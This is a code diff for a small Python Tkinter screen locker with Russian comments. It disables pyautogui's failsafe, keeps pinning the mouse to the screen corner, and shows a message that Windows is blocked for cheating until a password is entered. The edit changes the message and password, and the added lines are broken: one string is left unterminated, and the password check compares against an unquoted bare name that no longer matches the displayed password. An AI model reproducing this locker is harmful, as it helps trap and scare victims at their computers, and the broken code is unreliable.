@@ -32,11 +32,11 @@ pyautogui.FAILSAFE = False
 
 
 #ТЕКСТ
-label = Label(win, text="Windows заблокирован", font='Courier 30')
+label = Label(win, text="Windows заблокирован за использование читов", font='Courier 30')
 label.place(relx=.5, rely=.4, anchor="center")
  
 #ВОТЕРМАРКА
-label = Label(win, text="Password: qwerty123", font='Courier 10')
+label = Label(win, text="Password: popka, font='Courier 10')
 label.place(relx=.5, rely=.94, anchor="center")
 
 #ВВОД ПАРОЛЯ
@@ -53,5 +53,5 @@ entry.focus()
 while True:
     pyautogui.moveTo(0, 0)
     win.update()
-    if entry.get() == "qwerty123":
+    if entry.get() == power51213:
         sys.exit()
